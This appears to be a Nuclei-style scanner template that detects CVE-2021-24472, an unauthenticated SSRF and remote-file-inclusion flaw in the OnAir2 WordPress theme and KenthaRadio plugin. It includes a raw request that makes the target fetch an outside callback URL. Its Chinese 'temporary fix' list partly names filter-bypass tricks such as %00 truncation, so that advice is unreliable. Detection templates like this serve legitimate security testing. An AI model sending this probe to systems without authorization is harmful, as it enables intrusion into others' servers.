id: CVE-2021-24472
info:
  name: Onair2 < 3.9.9.2 & KenthaRadio < 2.0.2 - Remote File Inclusion/Server-Side
    Request Forgery
  author:
  - l0ne1y
  description: |-
    WordPress theme nair2 < 3.9.9.2 and WordPress Plugin KenthaRadio < 2.0.2 存在文件包含漏洞和服务器伪造请求漏洞
    WordPress是Wordpress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress 插件是WordPress开源的一个应用插件。

    OnAir2 WordPress theme 3.9.9.2之前版本和QT KenthaRadio WordPress plugin 2.0.2之前版本存在安全漏洞，该漏洞源于插件已经向未经身份验证的用户暴露了代理功能，向这个代理功能发送请求将会让web服务器从任何URI获取并显示内容，这将允许网站上存在SSRF(服务器端请求伪造)和RFI(远程文件包含)漏洞。
  severity: critical
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://wpscan.com/vulnerability/17591ac5-88fa-4cae-a61a-4dcf5dc0b72a

    临时修复方案：
    1、PHP 中使用 open_basedir 配置限制访问在指定的区域，路径长短截断
    2、过滤.（点）/（反斜杠）\\（反斜杠），编码绕过
    3、禁止服务器远程文件包含
    4、对于限制了包含文件后缀的情况，PHP版本小于5.3，php.ini magic_quotes_gpc = off，对可控参数未使用addslashes函数，满足这三个条件就可以使用%00截断。
    5、问号、井号、空格绕过（远程）
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    GET /?qtproxycall=http://{{interactsh-url}} HTTP/1.1
    Host: {{Hostname}}
    Origin: {{BaseURL}}
